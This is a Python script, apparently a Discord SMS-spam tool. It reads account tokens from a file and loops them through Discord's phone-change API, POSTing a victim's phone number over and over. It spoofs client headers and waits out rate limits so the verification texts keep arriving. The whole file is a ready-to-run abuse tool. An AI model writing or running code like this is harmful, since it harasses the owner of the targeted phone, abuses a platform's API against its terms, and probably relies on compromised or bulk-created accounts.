import time
import requests
tokens = open('tokens.txt').read().splitlines()
sessions = requests.Session()
PHONE = input(f'phone:')
DOMAIN = input(f'put the discord domain you wish to use (discordapp.com) or (discord.com):')
APICHOICE = input(f'choose an api link from the links canary. or ptb. (with the dots) if your not rate limited on the already set link then just press enter):')
def spam():
    while True:
      for token in tokens:
          headers = {'Authorization': f'{token}',
                     'Content-Type': 'application/json', 'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC40OSIsIm9zX3ZlcnNpb24iOiIxMC4wLjIyMDAwIiwib3NfYXJjaCI6Ing2NCIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImNsaWVudF9idWlsZF9udW1iZXIiOjE1MDU0MiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=', 'Cookie': 'getyourowncookieyounerd', 'Accept-Language': 'en-US,ka;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Accept': '*/*', 'scheme': 'https', 'path': '/api/v9/users/@me/phone', 'method': 'POST', 'authority': f'{APICHOICE}{DOMAIN}', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.49 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36', 'x-debug-options': 'bugReporterEnabled', 'x-discord-locale': 'en-US'}
          sess = sessions.post(f'https://{APICHOICE}{DOMAIN}/api/v9/users/@me/phone', headers=headers,
                               json={"phone": PHONE,
                                     'change_phone_reason': "user_settings_update"})
          print(sess.status_code)
          if 'retry_after' in sess.text:
              time.sleep(sess.json()['retry_after'])
          else:
              break


spam()